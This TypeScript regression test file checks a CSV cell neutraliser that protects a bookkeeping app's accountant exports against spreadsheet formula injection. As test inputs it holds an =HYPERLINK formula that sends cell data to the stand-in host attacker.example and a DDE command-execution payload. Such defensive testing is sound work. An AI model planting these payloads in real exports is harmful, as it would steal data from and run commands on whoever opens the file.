// [CSV-SAFE / H1] Regression tests for the one CSV cell neutraliser.
//   run: npx tsx --test src/lib/csv-safe.test.ts
//
// WHY THIS FILE EXISTS — csvCell guards exports that a THIRD PARTY opens:
// the accountant's "all clients" export, a single-client export, the GDPR
// download, and the quarter closing package. Every one of those lands in
// someone else's Excel.
//
// A cell that begins with = + - @ is a FORMULA there. A ZZP'er can name a
// client `=HYPERLINK("https://attacker.example/"&A1,"OK")`, and when the
// accountant opens the export, Excel executes it — exfiltrating the cell
// contents of a spreadsheet that holds every client's figures. The victim is
// not the person who typed it; it is the accountant, and BoekBrug's entire
// pitch is being the trustworthy bridge to that accountant.
//
// The protection is one regex in one small function. Nothing else stands behind
// it, so it is precisely the kind of line a future refactor "simplifies" away.
// These tests are what stop that.

import { csvCell } from "./csv-safe";

let passed = 0;
let failed = 0;
function check(name: string, cond: boolean) {
  if (cond) { passed++; console.log(`  ✓ ${name}`); }
  else { failed++; console.log(`  ✗ ${name}`); }
}

/**
 * What Excel actually parses out of one CSV field: strip the RFC-4180 wrapper
 * (if any) and un-double the escaped quotes.
 *
 * Asserting on the raw output would be testing the wrong thing — a payload that
 * ALSO contains a quote or CR gets wrapped, so it legitimately starts with `"`
 * rather than `'` while still being perfectly neutralised. What must hold is the
 * property Excel sees: the value it ends up with begins with an apostrophe, so
 * it is text and not a formula.
 */
function asExcelSees(cell: string): string {
  if (!cell.startsWith('"') || !cell.endsWith('"') || cell.length < 2) return cell;
  return cell.slice(1, -1).replace(/""/g, '"');
}

/** The security property, stated once. */
const isInert = (raw: string) => asExcelSees(csvCell(raw)).startsWith("'");

console.log("\n[CSV-SAFE / H1] formula leads are neutralised, never executed");

check(
  "the real attack: =HYPERLINK exfiltration is disarmed",
  isInert('=HYPERLINK("https://attacker.example/"&A1,"OK")')
);

check("a leading = is quoted", csvCell("=1+1") === "'=1+1");
check("a leading + is quoted", csvCell("+1") === "'+1");
check("a leading - is quoted", csvCell("-1+1") === "'-1+1");
check("a leading @ is quoted", csvCell("@SUM(A1)") === "'@SUM(A1)");
check("a leading tab is quoted", csvCell("\tcmd") === "'\tcmd");
check("a leading CR is neutralised (and RFC-4180-wrapped, as a CR must be)", isInert("\rcmd"));

check(
  "the classic DDE payload is disarmed",
  isInert('=cmd|\' /C calc\'!A0')
);

console.log("\n[CSV-SAFE] the neutraliser must not corrupt ordinary data");

check("an ordinary name passes through untouched", csvCell("Acme BV") === "Acme BV");
check("a name containing = but not leading is untouched", csvCell("A=B") === "A=B");
check("a plain number is untouched", csvCell(1234) === "1234");
check("a negative NUMBER is quoted (string form starts with -)", csvCell(-5) === "'-5");
check("null becomes empty, not the text 'null'", csvCell(null) === "");
check("undefined becomes empty", csvCell(undefined) === "");
check("an empty string stays empty", csvCell("") === "");

console.log("\n[CSV-SAFE] RFC-4180 quoting still holds");

check("a cell with the delimiter is quoted", csvCell("Acme; BV") === '"Acme; BV"');
check("a quote is doubled and wrapped", csvCell('He said "hi"') === '"He said ""hi"""');
check("a newline is wrapped", csvCell("line1\nline2") === '"line1\nline2"');
check("a CR is wrapped", csvCell("a\rb").includes('"'));
check(
  "a custom delimiter is honoured",
  csvCell("a,b", ",") === '"a,b"' && csvCell("a,b", ";") === "a,b"
);

console.log("\n[CSV-SAFE] both protections at once — the ordering that matters");

check(
  "a formula that ALSO needs quoting keeps the apostrophe INSIDE the quotes",
  // If the quoting ran first the apostrophe would land outside and Excel would
  // see a formula again. Order is load-bearing, so it is asserted exactly.
  csvCell('=A1;"x"') === `"'=A1;""x"""`
);

check(
  "a formula containing a newline stays neutralised",
  (() => {
    const out = csvCell("=A1\n=B2");
    return out.startsWith('"\'=') && out.endsWith('"');
  })()
);

console.log(`\n[CSV-SAFE] ${passed} passed, ${failed} failed\n`);
if (failed > 0) process.exit(1);
